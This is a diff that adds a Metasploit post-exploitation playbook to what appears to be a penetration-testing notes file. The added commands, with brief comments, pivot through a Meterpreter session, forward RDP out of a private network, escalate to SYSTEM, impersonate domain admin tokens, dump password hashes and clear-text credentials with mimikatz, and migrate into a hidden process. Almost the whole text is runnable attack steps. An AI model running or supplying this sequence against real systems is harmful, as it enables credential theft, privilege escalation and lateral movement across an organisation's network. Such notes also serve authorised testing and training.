@@ -29,4 +29,35 @@ set ExitOnSession false
 set EnableStageEncoding true
 exploit -j
 
+#setup route through meterpeter session for further port scanning/exploitation
+route add LOCALIP_OF_SERVER 255.255.255.0 1
+
+#setup port forwarding to expose private ports/services for further exploitation (expose RDP)
+portfwd add -L EXTERNAL_IP_OF_METASPLOIT -l 3389 -p 3389 -r LOCALIP_OF_SERVER
+
+#check if in local administrator group (from windows command shell)
+meterpreter>shell
+c:/>net localgroup Administrators
+
+#escalate privledges to nt authority\system if in administrator group
+meterpreter>getsystem
+
+#check if any elevated user tokens exist with incognito, i.e. domain accounts or domain admin accounts. Impersonate an account.
+meterpreter> use incognito
+meterpreter> list_tokens -u
+meterpreter> impersonate_token DOMAIN\\domain.admin
+
+#check for hashes and clear-text passwords are in memory using mimikatz (must be nt authority\system on correct architecture x86 ot x64)
+meterpreter> load mimikatz
+meterpreter> msv
+meterpreter> kerberos
+meterpreter> mimikatz_command -f samdump::hashes
+meterpreter> mimikatz_command -f sekurlsa::searchPasswords
+
+#create a new x64 process from an x86 meterpreter session and migrate into the process (need matching architecture for mimikatz..etc)
+meterpreter>execute -H -c -f "C:\\WINDOWS\\Sysnative\\notepad.exe"
+meterpreter>migrate PROCESSID (shown in preavious command)
+
+
+
 
